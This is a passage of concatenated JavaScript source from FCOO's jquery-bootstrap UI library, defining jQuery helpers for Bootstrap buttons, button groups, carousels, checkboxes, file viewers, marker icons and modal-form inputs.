            var result = [];
            $elem.children('.card').each( function(index, elem){
                var $elem = $(elem);
                result[index] = $elem.hasClass('show') ? getStatus($elem.find('> .collapse > .card-block > .accordion')) : false;
            });
            return result.length ? result : true;
        }
        return getStatus(this);
    };



    //Extend $.fn with method to open a card given by id (string) or index (integer)
    $.fn.bsOpenCard = function( indexOrId ){
        this.addClass('no-transition');
        var $accordionItem =
                this.children(
                    $.type(indexOrId) == 'number' ?
                    'div.accordion-item:nth-of-type('+(indexOrId+1)+')' :
                    'div.accordion-item[data-user-id="' + indexOrId + '"]'
                );

        if ($accordionItem && $accordionItem.length)
            $accordionItem.children('.collapse').collapse('show');
        this.removeClass('no-transition');
    };

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-button.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    var bsButtonClass = 'btn-jb';  //MUST correspond with $btn-style-name in src/_variables.scss

    /**********************************************************
    bsButton( options ) - create a Bootstrap-button
    Is also used to create list-items for select-lists
    **********************************************************/
    $.bsButton = function( options = {} ){
        var optionToClassName = {
                useStandardColor    : 'standard',
                primary             : 'primary',
                transparent         : 'transparent',
                transparentOnDark   : 'transparent-on-dark',
                semiTransparent     : 'semi-transparent',
                square              : 'square',
                bigSquare           : 'square big-square',
                bigIcon             : 'big-icon',
                extraLargeIcon      : 'extra-large-icon',
                selected            : 'selected',
                checkboxAtLeft      : 'checkbox-at-left',
                noBorder            : 'no-border',
                focus               : 'init_focus',
                truncate            : 'text-truncate',
                fullWidth           : 'w-100'
            };

        //Use standard color if not primary or transparent (any kind)
        if (options.useStandardColor === undefined){
            options.useStandardColor = true;
            ['primary'/*, 'transparent', 'transparentOnDark', 'semiTransparent'*/].forEach( function(id){
                if (options[id])
                    options.useStandardColor = false;
            });
        }

        //Add class-name corresponding to options
        var newClass = [options.class || ''];

        if (options._class)
            newClass.push(options._class);

        $.each( optionToClassName, function( id, className ){
            if (options[id] && (!$.isFunction(options[id]) || options[id]()))
                newClass.push(className);
        });
        options.class = newClass.join(' ');

        options =
            $._bsAdjustOptions( options, {
                tagName         : 'a', //Using <a> instead of <button> to be able to control font-family
                baseClass       : 'btn',
                styleClass      : bsButtonClass,
                useTouchSize    : true,
                addOnClick      : true,
                returnFromClick : false
            });

        //Special case for empty button
        if (!options.icon && !options.text)
            options.icon = 'fa';

        var result = $('<'+ options.tagName + ' tabindex="0"/>');

        //title are added to the button instead of only to the <span> with the text
        if (options.title){
            result.i18n(options.title, 'title');
            options.title = null;
        }

        if (options.tagName == 'a'){
            if (options.link)
                result
                    .i18n($._bsAdjustText(options.link), 'href')
                    .prop('target', '_blank');
            else
                //Adding href that don't scroll to top to allow anchor to get focus
                result.prop('href', 'javascript:undefined');
        }

        result._bsAddBaseClassAndSize( options );
        if (!options.radioGroup)
            result._bsAddIdAndName( options );

        if (options._width)
            result.width( options._width );
        if (options.buttonWidth)
            result.width( options.buttonWidth );

        if (options.attr)
            result.attr( options.attr );

        if (options.prop)
            result.prop( options.prop );

        result.data('bsButton_options', options );

        if (options.addOnClick && options.onClick)
            result.on('click', $.proxy( result._bsButtonOnClick, result ) );

        result._bsAddHtml( options, false, true, options.allowContent );

        if (options.radioGroup)
            options.radioGroup.addElement( result, options );

        return result;
    };

    /**********************************************************
    bsLinkButton( options ) - create a Bootstrap-button as a link
    **********************************************************/
    $.bsLinkButton = function( options ){
        return $.bsButton( $.extend({}, options, { styleClass: 'btn-link'}) );
    };

    /**********************************************************
    bsCheckboxButton( options ) - create a Bootstrap-button as a checkbox
    with 'blue' background when selected and individuel icons
    options:
        icon: string or array[0-1] of string
        text: string or array[0-1] of string
    If icon and/or text is array[0-1] the first value is used when en button is unselected
    and the second when the button is selected.
    E.g. text: ['Unselected', 'Selected']
    **********************************************************/
    $.bsCheckboxButton = function( options ){
        //Clone options to avoid reflux
        options = $.extend({}, options);

        if (options.semiSelected)
            options.selected = true;

        options.class = 'allow-zero-selected' + (options.class ? ' '+options.class : '');
        options.className_semi = 'semi-selected';

        //Use modernizr-mode and classes if icon and/or text containe two values
        if ($.isArray(options.icon) && (options.icon.length == 2)){
            options.icon = [[
                options.icon[0]+ ' icon-hide-for-selected',
                options.icon[1]+ ' icon-show-for-selected'
            ]];
            options.modernizr = true;
        }
        if ($.isArray(options.text)){
            options.textClassName = ['hide-for-selected', 'show-for-selected'];
            options.modernizr = true;
        }
        return $.bsButton( options ).checkbox( $.extend(options, {className: 'selected'}) );
    };


    /**********************************************************
    bsStandardCheckboxButton( options ) - create a standard
    Bootstrap-button as a checkbox with check-icon in blue box
    **********************************************************/
    $.bsStandardCheckboxButton = function( options = {}){
        //Clone options to avoid reflux
        options = $.extend({}, options, {
            class    : 'allow-zero-selected' + (options.class ? ' '+options.class : ''),
            modernizr: true,
        });


        var icon = [
                ((options.type == 'radio') || options.isRadio || options.radio) ?
                    //Radio-button icons
                    [
                        'fas fa-circle standard-checkbox-checked-color icon-show-for-checked',              //"Blue"/"Semi-selected-orange" background
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-dot-circle text-white icon-show-for-checked',  //Dot marker
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-circle'                                        //Border
                    ] :
                    //Checkbox-button icons
                    [
                        'fas fa-square standard-checkbox-checked-color icon-show-for-checked',                //"Blue"/"Semi-selected-orange" background
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-check-square text-white  icon-show-for-checked', //Check marker
                        $.FONTAWESOME_PREFIX_STANDARD + ' fa-square'                                          //Border
                    ]
            ];

        if (options.icon)
            icon.push(options.icon);

        options.icon = options.forceIcon || icon;

        if (options.semiSelected)
            options.selected = true;

        options.class = options.class + ' standard-checkbox';
        options.className_semi = 'semi-selected';

        //Bug fix: To avoid bsButton to add class 'active', selected is set to false in options for bsButton
        var bsButtonOptions = $.extend({}, options);
        bsButtonOptions.selected = false;
        var $result = $.bsButton( bsButtonOptions ).checkbox( $.extend(options, {className: 'checked'}) );

//        var $result = $.bsButton( bsButtonOptions ).checkbox( options );

        return $result;
    };

    /**********************************************************
    bsIconCheckboxButton( options ) - create a square
    Bootstrap-button as a checkbox with two given icons for
    checked and no-checked. No blue color
    icon = ["ICONS WHEN UNSELECTED", "ICONS WHEN SELECTED", "ICONS ALWAYS SHOWN (optional)"]
    **********************************************************/
    $.bsIconCheckboxButton = function( options ){
        var icon = [
                options.icon[0] + ' icon-hide-for-checked',
                options.icon[1] + ' icon-show-for-checked'
            ];
        if (options.icon.length > 2)
            icon.push( options.icon[2] );

        return $.bsStandardCheckboxButton( $.extend({}, options, {square: true, forceIcon: [icon]}) );
    };


    /**********************************************************
    bsBigIconButton( options ) - create a big button with a large icon to the left
    and text and sub-text to the right
    options:
        icon   : STRING
        text   : STRING or {LANG: STRING}
        subtext: {LANG: STRING} or []{LANG: STRING}|STRING
        subtextSeparator: STRING - use to join subtext if it is an array
        big    : BOOLEAN
        bold   : BOOLEAN
    **********************************************************/
    $._bsBigIconButtonContent = function( options ){
        var big = !!options.big,
            separator = options.subtextSeparator || '',
            content = [],
            subtext;

        if (options.icon)
            content.push(
                $('<div/>')
                    ._bsAddHtml({icon: options.icon})
                    .addClass((big ? 'fa-2x' : '') + ' align-self-center flex-shrink-0 text-center')
                    .width('1.75em')
            );

        //Create subtext. It can be an array of STRING or {LANG: STRING}
        if (options.subtext){
            var subtextArray = $.isArray(options.subtext) ? options.subtext : [options.subtext];
            subtext = {};

            $.each( subtextArray, function(index, next_subtext){
                $.each($._bsAdjustText( next_subtext ), function(lang, text){
                    subtext[lang] = subtext[lang] || '';
                    if (subtext[lang] && text)
                        subtext[lang] += separator;
                    subtext[lang] += text;
                });
            });
        }

        content.push(
            $('<div/>')
                .addClass('flex-grow-1 no-margin-children d-flex flex-column justify-content-center')
                .css('min-height', options.minHeight ? options.minHeight : big ? '3em' : '2em')
                ._bsAddHtml([
                    {text: options.text,  textClass: 'text-center' + (options.bold ? ' fw-bold' : '') + (big ? ' font-size-larger' : '' )},
                    options.subtext ? {text: subtext, textClass: 'text-center text-wrap '             + (big ? '' : ' font-size-smaller')} : null
                ])
        );

        return content;
    };


    $.bsBigIconButton = function( options ){
        return $.bsButton({
            id          : options.id,
            class       : 'w-100 d-flex',
            content     : $._bsBigIconButtonContent( options ),
            allowContent: true,
            radioGroup  : options.radioGroup,
            onClick     : options.onClick,
        });

    };


    /**********************************************************
    _anyBsButton( options )
    Create a specific variant of bs-buttons based on options.type
    **********************************************************/
    $._anyBsButton = function( options ){
        var type = options.type || 'button',
            constructor;

        switch (type.toLowerCase()){
            case 'button'                : constructor = $.bsButton; break;
            case 'checkboxbutton'        : constructor = $.bsCheckboxButton; break;
            case 'standardcheckboxbutton': constructor = $.bsStandardCheckboxButton; break;
            case 'iconcheckboxbutton'    : constructor = $.bsIconCheckboxButton; break;
            case 'bigiconbutton'         : constructor = $.bsBigIconButton; break;
            default                      : constructor = $.bsButton;
        }

        return constructor(options);
    },


    /**********************************************************
    bsButtonGroup( options ) - create a Bootstrap-buttonGroup
    **********************************************************/
    $.bsButtonGroup = function( options ){
        options =
            $._bsAdjustOptions( options, {
                tagName               : 'div',
                baseClass             : 'btn-group',
                leftClass             : 'btn-group-left', //Class for group when content is left-align
                centerClass           : '', //Class for group when content is center-align
                fullWidthClass        : 'btn-group-full-width',
                centerInParentClass   : 'btn-group-center-in-parent',
                verticalClassPostfix  : '-vertical',
                horizontalClassPostfix: '',
                center                : !options.vertical, //Default: center on horizontal and left on vertical
                useTouchSize          : true,
                attr                  : { role: 'group' },
                inclHeader            : options.vertical,   //Default: Include headers (= items without onClick)
                buttonOptions         : {
                    onClick         : options.onClick,
                    returnFromClick : options.returnFromClick,
                    _class          : 'text-truncate'
                }
            });

        options.baseClassPostfix = options.vertical ? options.verticalClassPostfix : options.horizontalClassPostfix;

        var result = options.container || options.$container || $('<'+ options.tagName + '/>');
        result
            ._bsAddIdAndName( options )
            ._bsAddBaseClassAndSize( options );

        //Transfere generel button-options to buttonOptions
        $.each(['square', 'bigSquare', 'bigIcon', 'extraLargeIcon'], function(index, id){
            if ((options[id] !== undefined) && (options.buttonOptions[id] === undefined))
                options.buttonOptions[id] = options[id];
        });


        if (options.center)
            result.addClass( options.centerClass );
        else
            result.addClass( options.leftClass );

        if (options.verticalClassPostfix && options.vertical)
            result.addClass(options.baseClass + options.verticalClassPostfix );

        if (options.horizontalClassPostfix && !options.vertical)
            result.addClass(options.baseClass + options.horizontalClassPostfix );

        if (options.allowZeroSelected)
            result.addClass( 'allow-zero-selected' );

        if (options.fullWidthClass && options.fullWidth)
            result.addClass(options.fullWidthClass);

        if (options.centerInParentClass && options.centerInParent)
            result.addClass(options.centerInParentClass);


        if (options.border)
            result.addClass('btn-group-border');

        if (options.noRoundBorder)
            result.addClass('btn-group-no-round-border');

        if (options.attr)
            result.attr( options.attr );

        var $previousButton = null,
            spaceAfter     = false;
        $.each( options.list, function(index, buttonOptions ){

           if ((buttonOptions.spaceBefore || buttonOptions.lineBefore || spaceAfter) && $previousButton){
                $previousButton.addClass('space-after');
            }

            spaceAfter      = buttonOptions.spaceAfter || buttonOptions.lineAfter;
            $previousButton = null;

            if (buttonOptions.id || buttonOptions.onClick  || buttonOptions.onChange)
                $previousButton =
                    $._anyBsButton( $.extend(true, {}, options.buttonOptions, buttonOptions ) )
                        .appendTo( result );
            else
                if (options.inclHeader)
                    //Create content as header
                    $('<div/>')
                        .addClass('btn header-content')
                        .toggleClass('header-main', !!buttonOptions.mainHeader)

                        .addClass( buttonOptions.class )
                        ._bsHeaderAndIcons( {header: buttonOptions} )
                        .appendTo( result );
        });
        return result;
    };

    /**********************************************************
    bsRadioButtonGroup( options ) - create a Bootstrap-buttonGroup
    options:
        id               : id for the group
        onChange         : function(id, selected, $buttonGroup)
	    allowZeroSelected: boolean. If true it is allowed to des-select a selected radio-button.
	                       If allowZeroSelected=true onChange will also be called on the un-selected radio-input
        buttons          : as bsButtonGroup
    **********************************************************/
    $.bsRadioButtonGroup = function( options ){
        options.items = options.items || options.list;
        options.list = options.list || options.items;

        //Set options for RadioGroup
        $.each( options.list, function(index, buttonOptions ){
            buttonOptions = $._bsAdjustOptions( buttonOptions );
            if (buttonOptions.id && buttonOptions.selected && (!$.isFunction(buttonOptions.selected) || buttonOptions.selected()) ) {
                options.selectedId = buttonOptions.id;
                return false;
            }
        });

        var radioGroup =
                $.radioGroup(
                    $.extend({}, options, {
                        radioGroupId     : options.id,
                        className        : 'selected',
                        className_semi   : 'semi-selected',
                        allowZeroSelected: false,
                    })
                );


        options =
            $._bsAdjustOptions( options, {}, {
                useTouchSize: true,
                addOnClick: false,
            });

        options.buttonOptions = options.buttonOptions || {};
        options.buttonOptions.radioGroup = radioGroup;
        options.buttonOptions.type = options.buttonType;

        var result = $.bsButtonGroup( options );
        result.data('radioGroup', radioGroup );
        return result;
    };


    /**********************************************************
    bsButtonBar( options ) - create a horizontal group of buttons
    options:
        inclHeader : false. If true buttons without id or onClick are included
        justify    : "start", "end", "center", "between", "around", or "evenly"
        buttons    : as bsButtonGroup
    **********************************************************/
    $.bsButtonBar = function( options ){
        options =
            $._bsAdjustOptions( options, {
                fullWidthClass  : 'w-100',
                fullWidth       : true,
                class           : 'm-0 p-0 d-flex flex-row flex-nowrap justify-content-'+(options.justify || options.align || 'center'),
            }, {
                baseClass   : 'btn-bar',
                vertical    : false,
                center      : true,
                useTouchSize: true,
                buttonOptions: {
                    _class: 'flex-shrink-1 text-truncate'
                }
            } );

        var result = $.bsButtonGroup( options );

        return result;
    };




}(jQuery, this, document));
;
/****************************************************************************
jquery-bootstrap-carousel.js
****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

/******************************************************************
bsCarousel( options )
options


    list: []{
        icon          : STRING
        text          : {da:STRING, en:STRING}
        subIcon       : STRING
        subText       : {da:STRING, en:STRING}
        url           : STRING
        onClick       : function(url, options)
        defaultOnClick: BOOLEAN                 //If true: As options.defaultOnClick
    }
    innerHeight     : INTEGER   //The height of the inner-container with the items
    fitHeight       : BOOLEAN   //If true and innerHeight is set: All images get max-height = innerHeight
    itemsMaxOwnSize : BOOLEAN   //If true, or innerHeight and fitHeight is set: Image size can be bigger that its original size

    itemOnClick     : function(url, options)
    defaultOnClick  : BOOLEAN   //If true and no itemOnClick or item.onClick: Click on image open a modal-window



    columns = [] of {
        vfFormat,
        vfOptions:  The content of a element can be set and updated using [jquery-value-format].
                    The options vfFormat and (optional) vfOptions defines witch format used to display the content

        align        :  'left','center','right'. Defalut = 'left'
        verticalAlign: 'top', 'middle','bottom'. Default = 'middle'
        noWrap       : false. If true the column will not be wrapped = fixed width
    }

    verticalBorder: [boolean] true. When true vertical borders are added together with default horizontal borders
    noBorder      : [boolean] true. When true no borders are visible

    align        : 'left','center','right'. Defalut = 'left' = default align for all columns
    verticalAlign: 'top', 'middle','bottom'. Default = 'middle' = default verticalAlign for all columns

<div id="..." class="carousel slide">
  <div class="carousel-indicators">
    <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="0" class="active" aria-current="true" aria-label="Slide 1"></button>
    <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="1" aria-label="Slide 2"></button>
    <button type="button" data-bs-target="#carouselExampleDark" data-bs-slide-to="2" aria-label="Slide 3"></button>
  </div>
  <div class="carousel-inner">





*******************************************************************/
    var bsCarouselId = 0;


    function defaultOnClick(url, options){
        $.bsModalImage(url, options).show();
    }

    function item_onClick(e){
        var $img = e && e.target ? $(e.target) : null;
        if (!$img) return false;

        var itemOptions = $img.data('bsc-item-options');

        if (itemOptions && itemOptions.onClick)
            itemOptions.onClick(itemOptions.url, itemOptions);
    }

    /**********************************************************
    bsCarousel( options ) - create a Bootstrap carousel
    **********************************************************/
    $.bsCarousel = function( options ){
        if (Array.isArray(options))
            options = {list: options};

        var id = options.id = options.id || 'bsCarousel_' + bsCarouselId++,
            multiItems = options.list.length > 1;
        this.options = options;

        var $result = $('<div data-bs-theme="dark"/>')
                .attr('id', id)
                .addClass('carousel carousel-dark slide')
                .toggleClass('items-max-own-size', !!(options.itemsMaxOwnSize || (options.innerHeight && options.fitHeight))),
            $indicators = $('<div/>')
                .addClass('carousel-indicators'),
            $inner = $('<div/>')
                .addClass('carousel-inner')
                .height(options.innerHeight)
                .appendTo($result);
        if (multiItems){
            $indicators.appendTo($result);

            $('<button class="carousel-control-prev" type="button" data-bs-target="#' + id + '" data-bs-slide="prev">')
                .append(
                    $('<span class="carousel-control-prev-icon" aria-hidden="true"></span>'),
                    $('<span class="visually-hidden">Previous</span>')
                )
                .appendTo($result);
            $('<button class="carousel-control-next" type="button" data-bs-target="#' + id + '" data-bs-slide="next">')
                .append(
                    $('<span class="carousel-control-next-icon" aria-hidden="true"></span>'),
                    $('<span class="visually-hidden">Next</span>')
                )
                .appendTo($result);
        }

        this.options.list.forEach( (item, index) => {
            var active = index == 0;

            item.index = index;

            if (multiItems)
                $('<button type="button" data-bs-target="#' + id + '" data-bs-slide-to="' + index + '"></button>')
                    .toggleClass('active', !!active)
                        .appendTo($indicators);

            var $item = $('<div/>')
                    .addClass('carousel-item')
                    .toggleClass('active', !!active)
                    .appendTo($inner),

                //The image
                $img = $('<img src="' + item.url + '"/>')
                    .addClass('d-block w-100')
                    .appendTo($item);
                if (options.innerHeight && options.fitHeight)
                    $img.css('max-height', options.innerHeight);

                //Find onClick (if any)
                item.onClick =
                    item.onClick ? item.onClick :
                    item.defaultOnClick ? defaultOnClick :
                    options.onClick ? options.onClick :
                    options.defaultOnClick ? defaultOnClick : null;
                if (item.onClick)
                    $img
                        .data('bsc-item-options', item)
                        .attr('role', 'button')
                        .on('click', item_onClick);



            //Caption
            if (item.icon || item.text || item.subIcon || item.subText){
                var $caption = $('<div />')
                        .addClass('carousel-caption _d-none')
                        .addClass('_d-md-block')     //<= set when the capition is visible. MANGLER skal justeres!!!
                        .appendTo($item);

                var $innerCation = $('<div/>')
                        .addClass('carousel-caption-inner w-100 d-flex flex-column align-items-center')
                        .appendTo($caption);


                    if (item.icon || item.text)
                        $('<div/>')
                            .addClass('caption')
                            ._bsAddHtml({icon: item.icon, text: item.text})
                            .appendTo($innerCation);

                    if (item.subIcon || item.subText)
                        $('<div/>')
                            .addClass('caption caption-sm')
                            ._bsAddHtml({icon: item.subIcon, text: item.subText})
                            .appendTo($innerCation);
            }
        });

        return $result;
    };
}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-checkbox.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($/*, window/*, document, undefined*/) {
	"use strict";

    var bsCheckBoxId = 0;

    /**********************************************************
    bsCheckbox( options ) - create a Bootstrap checkbox
    **********************************************************/
    $.bsCheckbox = function( options ){

        options.id = options.id || 'bsCheckBox_' + bsCheckBoxId++;
        options.type = options.type || 'checkbox';
        options.className_semi = 'semi-selected';

        if (options.semiSelected){
            options.selected = true;
        }

        options =
            $._bsAdjustOptions( options, {
                useTouchSize: true,
                baseClass   : options.type
            });

        //Create outer div
        var $result = $('<div/>')._bsAddBaseClassAndSize( options ),

        //Create input-element
            $input =
                $('<input/>')
                    .addClass('cbxInput')
                    .addClass('form-check-input')
                    .prop({
                        type   : 'checkbox',
                        checked: options.selected
                    })
                    ._bsAddIdAndName( options )
                    .appendTo( $result );

        //Allow multi-lines
        $result.toggleClass('multi-lines', !!options.multiLines);

        /*
        If options.onClick = function(id, state, checkbox) exists => The control of setting
        and getting the state of the checkbox/radio is transfered to the onClick-function.
        This option prevent the default click-event for the input. The state of the input must be set using the cbxSetXXXX-methods of checkbox
        */
        if (options.onClick){
            $input.on('click', $.proxy($result._cbx_onClick, $result) ),

            //Add options used by $.fn._cbxSet
            $input.data('cbx_options', options);
        }
        else
            //Create input-element as checkbox from jquery-checkbox-radio-group
            $input.checkbox( options );

        //Get id and update input.id
        $input.prop({id: options.id });

        //Add label
        var $label = $('<label/>')
                        .prop('for', options.id )
                        .appendTo( $result );

        var content = options.content ? options.content : {icon: options.icon, text: options.text};
        $('<div/>')._bsAddHtml( content ).appendTo( $label );

        return $result;
    };

    //Extend $.fn with methods to set and get the state of bsCheckbox and to handle click
    $.fn.extend({
        _cbx_getInput: function(){
            return this.children('input.cbxInput');
        },

        cbxOptions: function(){
            return this._cbx_getInput().data('cbx_options');
        },

        cbxSetSelected: function(callOnChange){
            return this.cbxSetState(true, callOnChange);
        },
        cbxSetUnselected: function(callOnChange){
            return this.cbxSetState(false, callOnChange);
        },
        cbxSetSemiSelected: function(callOnChange){
            return this.cbxSetState('semi', callOnChange);
        },

        cbxToggleState: function(callOnChange){
            return this.cbxSetState(!this.cbxOptions().selected, callOnChange);
        },

        cbxSetState: function(state, callOnChange){
            var checked = !!state;

            this._cbx_getInput()._cbxSet(checked, !callOnChange);

            this._cbx_getInput().prop('checked', checked);

            //Update semi-selected class
            this._cbx_getInput().toggleClass( this.cbxOptions().className_semi, !!(state && (state !== true)) );

            return this;
        },

        cbxGetState: function(){
            var result = this.cbxOptions().selected;
            if (result && this._cbx_getInput().hasClass(this.cbxOptions().className_semi))
                result = 'semi';
            return result;
        },

        _cbx_onClick: function(event){
            //Prevent default event and call the users onClick-function instead
            //The onClick-function must bee called with delay to allow update of the input-element

            var _this       = this,
                options     = this.cbxOptions(),
                state       = this.cbxGetState(),
                onClickFunc = options.onClick;

            setTimeout(function(){
                onClickFunc(options.id, state, _this);
            }, 10);

            event.preventDefault();
        }
    });

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-file-view.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

    $.bsFileView creates a <div>-element with viewer of a file (if possible) and
    buttons to view the file in bsModalFile and in a new Tab Page

****************************************************************************/

(function ($, i18next,  window /*, document, undefined*/) {
	"use strict";

    var fileViewHeaderClasses = 'modal-header header-content header-content-smaller header-content-inner';

    /**********************************************************
    **********************************************************/
    $.bsFileView = $.bsFileview = function( options = {}){
        var fileName    = $._bsAdjustText(options.fileName),
            theFileName = i18next.sentence(fileName),
            fileNameExt = window.url('fileext', theFileName),
            $result     = $('<div/>')
                            ._bsAddBaseClassAndSize( $.extend({}, options, {
                                baseClass   : 'form-control',
                                class       : 'p-0 mb-1',
                                useTouchSize: true
                            }));


        //Create the header (if any)
        if (options.header)
            $('<div/>')
                .addClass(fileViewHeaderClasses)
                ._bsAddHtml(options.header)
                .appendTo($result);

        //Create the view
        var $container =
                $('<div/>')
                    .addClass('text-center p-1')
                    .appendTo($result);

        switch (fileNameExt){
            //*********************************************
            case 'jpg':
            case 'jpeg':
            case 'gif':
            case 'png':
            case 'tiff':
            case 'bmp':
            case 'ico':
                $('<img src="' + theFileName + '"/>')
                    .css('width', '100%')
                    .appendTo($container);

                break;

            //*********************************************
            default:
                $container
                    .addClass('text-center')
                    ._bsAddHtml({text: fileName});

                $('<div/>')
                    .removeClass('text-center')
                    .addClass('footer-content flex-column')
                    .appendTo($result)
                    .append(
                        $('<div/>')._bsAddHtml([
                            { text: {da: 'Klik på', en:'Click on'} },
                            { icon: 'fa-window-maximize', text: {da: 'for at se dokumentet i et nyt vindue', en: 'to see the document in a new window'} },
                        ])
                    )
                    .append(
                        $('<div/>')._bsAddHtml([
                            { text: {da: 'Klik på', en:'Click on'} },
                            { icon: $.bsExternalLinkIcon, text: {da: 'for at se dokumentet i en ny fane', en: 'to see the document in a new Tab Page'} },
                        ])
                    );
        }

        //Create the Show and Open-buttons
        $('<div/>')
            .addClass('modal-footer')
            .css('justify-content',  'center')
            ._bsAppendContent([
                $.bsButton(
                    {icon: $.FONTAWESOME_PREFIX + ' fa-window-maximize',
                    text: {da:'Vis',  en:'Show'},
                    onClick: function(){
                        $.bsModalFile( fileName, {header: options.header} );
                    }
                }),
                $.bsButton( {icon: $.bsExternalLinkIcon, text: {da: 'Åbne', en: 'Open'}, link: fileName } )
            ])
            .appendTo($result);

        return $result;
    };

}(jQuery, this.i18next, this, document));
;
/****************************************************************************
	jquery-bootstrap-fontawesome.js,

	(c) 2017, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($/*, window, document, undefined*/) {
	"use strict";

    /*******************************************
    $.bsMarkerAsIcon(colorClassName, borderColorClassName, options)
    Return options to create a marker-icon = round icon with
    inner color given as color in colorClassName and
    border-color given as color in borderColorClassName
    options:
        faClassName: fa-class for symbol. Default = "fa-circle"
        extraClassName: string or string[]. Extra class-name added
        partOfList : true if the icon is part of a list => return [icon-name] instead of [[icon-name]]
    ********************************************/
    $.bsMarkerAsIcon = function(colorClassName, borderColorClassName, options = {}){
        options = $.extend({
            faClassName   : 'fa-circle',
            extraClassName: '',
            partOfList    : false
        }, options);

        colorClassName       = colorClassName || 'text-white';
        borderColorClassName = borderColorClassName || 'text-black';

        var className =
                options.faClassName + ' ' +
                ($.isArray(options.extraClassName) ? options.extraClassName.join(' ') : options.extraClassName) +
                ' ';
        var result = [
            'fas ' + className + colorClassName,
            $.FONTAWESOME_PREFIX + ' ' + className + borderColorClassName
        ];

        return options.partOfList ? result : [result];
    };

    //Backwards comparability
    $.bsMarkerIcon = $.bsMarkerAsIcon;

}(jQuery, this, document));
;
/****************************************************************************
	jquery-bootstrap-form.js

	(c) 2018, FCOO

	https://github.com/fcoo/jquery-bootstrap
	https://github.com/fcoo

****************************************************************************/

(function ($, window, document, undefined) {
	"use strict";

    var formId = 0,
        inputId = 0;


    var defaultOptions = {
            content       : '',
            show          : false,
            closeText     : {da:'Annullér', en:'Cancel'},
            submitIcon    : 'fa-check',
            submitText    : {da:'Ok', en:'Ok'},
            buttons       : [],     //Extra button between
            static        : true,   //Only close modal-form on (X)
            formValidation: false,  //When true: make room for formValidation messages
            closeWithoutWarning: false, //When true the form can close without warning for not-saved changes
        };


    //BsModalinput = internal object representing an input-element in the form
    function BsModalInput( options, modalForm ){
        options.items = options.items || options.list;
        options.list = options.list || options.items;

        this.options = options;
        this.modalForm = modalForm;
        this.options.userId = this.options.id;
        this.options.id = 'bsInputId' + inputId++;
    }


    /*******************************************************
    Export to jQuery
    *******************************************************/
    $.BsModalInput = BsModalInput;
    $.bsModalInput = function( options ){
        return new $.BsModalInput( options );
    };

    $.BsModalInput.prototype = {
        /*******************************************************
        getElement
        *******************************************************/
        getElement: function(){
            this.$element = this.$element || this.modalForm.$form.find( '#'+ this.options.id );
            return this.$element;
        },

        /*******************************************************
        getSlider
        *******************************************************/
        getSlider: function(){
            this.slider = this.slider || this.getElement().data('slider');
            return this.slider;
        },

        /*******************************************************
        getRadioGroup
        *******************************************************/
        getRadioGroup: function(){
            this.radioGroup = this.radioGroup || this.getElement().data('radioGroup');
            return this.radioGroup;
        },

        /*******************************************************
        getInputGroupContainer
        getFormGroup for backward combatibility
        *******************************************************/
        getInputGroupContainer: function(){
             this.$formGroup = this.$formGroup || this.getElement().parents('.input-group-container').first();
            if (!this.$formGroup.length)
                this.$formGroup = this.getElement();
            return this.$formGroup;
        },
        getFormGroup: function(){
            return this.getInputGroupContainer();
        },

        /*******************************************************
        setValue
        *******************************************************/
        setValue: function(value){
            var $elem = this.getElement(),
                isSemiSelected;

            //Special case: If it is a element with possible semi-selected value and vaule is a string/array => the element get semi-selected mode (yellow background)
            if (this.canBeSemiSelected){
                var semiSelectedValue;

                isSemiSelected = ($.type(value) == this.semiSelectedValueType);
                if ((isSemiSelected && this.semiSelectedValueType == 'array')){
                    semiSelectedValue = value[1];
                    value             = value[0];
                }
                else
                    semiSelectedValue = value;
            }

            switch (this.options.type || 'input'){
                case 'input'   :
                case 'select'  : $elem.val( value );                break;

                case 'checkbox': $elem.prop('checked', value );     break;

                case 'checkboxbutton'        :
                case 'standardcheckboxbutton':
                case 'iconcheckboxbutton'    : $elem._cbxSet(value, true, isSemiSelected, semiSelectedValue); break;

                case 'selectlist'  : this.getRadioGroup().setSelected(value); break;

                case 'selectbutton': $elem._bsSelectButton_setValue( value ); break;

                case 'radiobuttongroup': this.getRadioGroup().setSelected(value, false, isSemiSelected, semiSelectedValue); break;

                case 'slider'    :
                case 'timeslider': this.getSlider().setValue( value );  break;
                case 'text'      :                                      break;
                case 'hidden'    : $elem.val( value );                  break;
            }
            this.onChanging();
            return this;
        },

        /*******************************************************
        getResetValue: function(){
        *******************************************************/
        getResetValue: function(){
            var result;
            switch (this.options.type || 'input'){
                case 'input'            : result = '';    break;
                case 'select'           :
                case 'selectbutton'     : result = null;  break;

                case 'checkbox'              :
                case 'checkboxbutton'        :
                case 'standardcheckboxbutton':
                case 'iconcheckboxbutton'    : result = false; break;

                case 'selectlist'       :
                case 'radiobuttongroup' : result = this.getRadioGroup().options.list[0].id; break;

                case 'slider'           :
                case 'timeslider'       : result = this.getSlider().result.min; break;

                case 'text'             :
                case 'hidden'           : result = '';                          break;

                default                 : result = false;
            }
            return result;
        },

        /*******************************************************
        resetValue
        *******************************************************/
        resetValue: function( onlyResetValidation ){
            if (!onlyResetValidation)
                return this.setValue( this.getResetValue() );
        },

        /*******************************************************
        _getSliderValue
        *******************************************************/
        _getSliderValue: function(){
            return this.getSlider().result.value;
        },

        /*******************************************************
        getValue
        *******************************************************/
        getValue: function(){
            var $elem = this.getElement(),
                result = null;

            switch (this.options.type || 'input'){
                case 'input'   :
                case 'select'  : result = $elem.val();                    break;

                case 'checkbox': result = !!$elem.prop('checked');        break;

                case 'checkboxbutton'        :
                case 'standardcheckboxbutton':
                case 'iconcheckboxbutton'    : result = !!$elem._cbxGet();              break;

                case 'selectlist'       : result = this.getRadioGroup().getSelected();  break;
